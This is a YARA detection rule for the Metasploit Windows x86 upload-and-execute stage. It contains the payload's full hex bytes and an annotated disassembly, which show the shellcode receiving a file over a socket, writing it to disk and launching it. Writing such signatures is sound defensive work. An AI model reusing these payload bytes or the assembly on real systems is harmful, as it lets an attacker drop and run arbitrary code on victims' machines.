
    rule stage_upexec___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::stage_upexec::__start0__"
    
        /*
            83EC40               | ..@                  | sub esp,0x40
            FC                   | .                    | cld
            89FB                 | ..                   | mov ebx,edi
            E84B000000           | .K...                | call 0x56
            60                   | `                    | pusha
            8B6C2424             | .l$$                 | mov ebp,[esp+0x24]
            8B453C               | .E<                  | mov eax,[ebp+0x3c]
            8B7C0578             | .|.x                 | mov edi,[ebp+eax+0x78]
            01EF                 | ..                   | add edi,ebp
            8B4F18               | .O.                  | mov ecx,[edi+0x18]
            8B5F20               | ._                   | mov ebx,[edi+0x20]
            01EB                 | ..                   | add ebx,ebp
            49                   | I                    | dec ecx
            8B348B               | .4.                  | mov esi,[ebx+ecx*4]
            01EE                 | ..                   | add esi,ebp
            31C0                 | 1.                   | xor eax,eax
            99                   | .                    | cdq
            AC                   | .                    | lodsb
            84C0                 | ..                   | test al,al
            0F8406000000         | ......               | jz 0x39
            C1CA0D               | ...                  | ror edx,0xd
            01C2                 | ..                   | add edx,eax
            EBF3                 | ..                   | jmp short 0x2d
            3B542428             | ;T$(                 | cmp edx,[esp+0x28]
            0F85E0FFFFFF         | ......               | jnz 0x24
            8B5F24               | ._$                  | mov ebx,[edi+0x24]
            01EB                 | ..                   | add ebx,ebp
            668B0C4B             | f..K                 | mov cx,[ebx+ecx*2]
            8B5F1C               | ._.                  | mov ebx,[edi+0x1c]
            01EB                 | ..                   | add ebx,ebp
            032C8B               | .,.                  | add ebp,[ebx+ecx*4]
            896C241C             | .l$.                 | mov [esp+0x1c],ebp
            61                   | a                    | popa
            C3                   | .                    | ret
            64A130000000         | d.0...               | mov eax,[fs:0x30]
            8B400C               | .@.                  | mov eax,[eax+0xc]
            8B701C               | .p.                  | mov esi,[eax+0x1c]
            AD                   | .                    | lodsd
            8B4008               | .@.                  | mov eax,[eax+0x8]
            50                   | P                    | push eax
            89E6                 | ..                   | mov esi,esp
            688E4E0EEC           | h.N..                | push dword 0xec0e4e8e
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            666A00               | fj.                  | push word 0x0
            66683332             | fh32                 | push word 0x3233
            687773325F           | hws2_                | push dword 0x5f327377
            89E5                 | ..                   | mov ebp,esp
            55                   | U                    | push ebp
            FFD0                 | ..                   | call eax
            894608               | .F.                  | mov [esi+0x8],eax
            68B61918E7           | h....                | push dword 0xe71819b6
            FF7608               | .v.                  | push dword [esi+0x8]
            FF5604               | .V.                  | call near [esi+0x4]
            89460C               | .F.                  | mov [esi+0xc],eax
            6A00                 | j.                   | push byte +0x0
            6A04                 | j.                   | push byte +0x4
            55                   | U                    | push ebp
            53                   | S                    | push ebx
            FF560C               | .V.                  | call near [esi+0xc]
            8B7D00               | .}.                  | mov edi,[ebp+0x0]
            E807000000           | .....                | call 0xb2
            43                   | C                    | inc ebx
            3A5C746D             | :\tm                 | cmp bl,[esp+esi*2+0x6d]
            0F8026000000         | ..&...               | jo 0xdc
            650F8859000000       | e..Y...              | gs js 0x116
            005889               | .X.                  | add [eax-0x77],bl
            46                   | F                    | inc esi
            1068A5               | .h.                  | adc [eax-0x5b],ch
            17                   | .                    | pop ss
            007CFF36             | .|.6                 | add [edi+edi*8+0x36],bh
            FF5604               | .V.                  | call near [esi+0x4]
            6A00                 | j.                   | push byte +0x0
            6A06                 | j.                   | push byte +0x6
            6A04                 | j.                   | push byte +0x4
            6A00                 | j.                   | push byte +0x0
            6A07                 | j.                   | push byte +0x7
            68000000E0           | h....                | push dword 0xe0000000
            FF7610               | .v.                  | push dword [esi+0x10]
            FFD0                 | ..                   | call eax
            894614               | .F.                  | mov [esi+0x14],eax
            81EC04080000         | ......               | sub esp,0x804
            89E5                 | ..                   | mov ebp,esp
            681F790AE8           | h.y..                | push dword 0xe80a791f
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            894618               | .F.                  | mov [esi+0x18],eax
            6A00                 | j.                   | push byte +0x0
            6800080000           | h....                | push dword 0x800
            55                   | U                    | push ebp
            53                   | S                    | push ebx
            FF560C               | .V.                  | call near [esi+0xc]
            29C7                 | ).                   | sub edi,eax
            50                   | P                    | push eax
            89E1                 | ..                   | mov ecx,esp
            6A00                 | j.                   | push byte +0x0
            51                   | Q                    | push ecx
            50                   | P                    | push eax
            55                   | U                    | push ebp
            FF7614               | .v.                  | push dword [esi+0x14]
            FF5618               | .V.                  | call near [esi+0x18]
            58                   | X                    | pop eax
            85FF                 | ..                   | test edi,edi
            0F85CFFFFFFF         | ......               | jnz 0xec
            68FB97FD0F           | h....                | push dword 0xffd97fb
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            FF7614               | .v.                  | push dword [esi+0x14]
            FFD0                 | ..                   | call eax
            6A50                 | jP                   | push byte +0x50
            59                   | Y                    | pop ecx
            29CC                 | ).                   | sub esp,ecx
            89E7                 | ..                   | mov edi,esp
            6A44                 | jD                   | push byte +0x44
            89E2                 | ..                   | mov edx,esp
            31C0                 | 1.                   | xor eax,eax
            F3AA                 | ..                   | rep stosb
            FE422D               | .B-                  | inc byte [edx+0x2d]
            FE422C               | .B,                  | inc byte [edx+0x2c]
            93                   | .                    | xchg eax,ebx
            8D7A38               | .z8                  | lea edi,[edx+0x38]
            AB                   | .                    | stosd
            AB                   | .                    | stosd
            AB                   | .                    | stosd
            6872FEB316           | hr...                | push dword 0x16b3fe72
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            57                   | W                    | push edi
            52                   | R                    | push edx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            6A01                 | j.                   | push byte +0x1
            51                   | Q                    | push ecx
            51                   | Q                    | push ecx
            FF7610               | .v.                  | push dword [esi+0x10]
            51                   | Q                    | push ecx
            FFD0                 | ..                   | call eax
            68ADD905CE           | h....                | push dword 0xce05d9ad
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            6AFF                 | j.                   | push byte -0x1
            FF37                 | .7                   | push dword [edi]
            FFD0                 | ..                   | call eax
            6825B0FFC2           | h%...                | push dword 0xc2ffb025
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            FF7610               | .v.                  | push dword [esi+0x10]
            FFD0                 | ..                   | call eax
            68E779C679           | h.y.y                | push dword 0x79c679e7
            FF7608               | .v.                  | push dword [esi+0x8]
            FF5604               | .V.                  | call near [esi+0x4]
            FF77FC               | .w.                  | push dword [edi-0x4]
            FFD0                 | ..                   | call eax
            68F08A045F           | h..._                | push dword 0x5f048af0
            FF36                 | .6                   | push dword [esi]
            FF5604               | .V.                  | call near [esi+0x4]
            FFD0                 | ..                   | call eax
        */
    
        strings:
            $a   = { 83 ec 40 fc 89 fb e8 4b 00 00 00 60 8b 6c 24 24 8b 45 3c 8b 7c 05 78 01 ef 8b 4f 18 8b 5f 20 01 eb 49 8b 34 8b 01 ee 31 c0 99 ac 84 c0 0f 84 06 00 00 00 c1 ca 0d 01 c2 eb f3 3b 54 24 28 0f 85 e0 ff ff ff 8b 5f 24 01 eb 66 8b 0c 4b 8b 5f 1c 01 eb 03 2c 8b 89 6c 24 1c 61 c3 64 a1 30 00 00 00 8b 40 0c 8b 70 1c ad 8b 40 08 50 89 e6 68 8e 4e 0e ec ff 36 ff 56 04 66 6a 00 66 68 33 32 68 77 73 32 5f 89 e5 55 ff d0 89 46 08 68 b6 19 18 e7 ff 76 08 ff 56 04 89 46 0c 6a 00 6a 04 55 53 ff 56 0c 8b 7d 00 e8 07 00 00 00 43 3a 5c 74 6d 0f 80 26 00 00 00 65 0f 88 59 00 00 00 00 58 89 46 10 68 a5 17 00 7c ff 36 ff 56 04 6a 00 6a 06 6a 04 6a 00 6a 07 68 00 00 00 e0 ff 76 10 ff d0 89 46 14 81 ec 04 08 00 00 89 e5 68 1f 79 0a e8 ff 36 ff 56 04 89 46 18 6a 00 68 00 08 00 00 55 53 ff 56 0c 29 c7 50 89 e1 6a 00 51 50 55 ff 76 14 ff 56 18 58 85 ff 0f 85 cf ff ff ff 68 fb 97 fd 0f ff 36 ff 56 04 ff 76 14 ff d0 6a 50 59 29 cc 89 e7 6a 44 89 e2 31 c0 f3 aa fe 42 2d fe 42 2c 93 8d 7a 38 ab ab ab 68 72 fe b3 16 ff 36 ff 56 04 57 52 51 51 51 6a 01 51 51 ff 76 10 51 ff d0 68 ad d9 05 ce ff 36 ff 56 04 6a ff ff 37 ff d0 68 25 b0 ff c2 ff 36 ff 56 04 ff 76 10 ff d0 68 e7 79 c6 79 ff 76 08 ff 56 04 ff 77 fc ff d0 68 f0 8a 04 5f ff 36 ff 56 04 ff d0 }
    
        condition:
            any of them
    }
    
    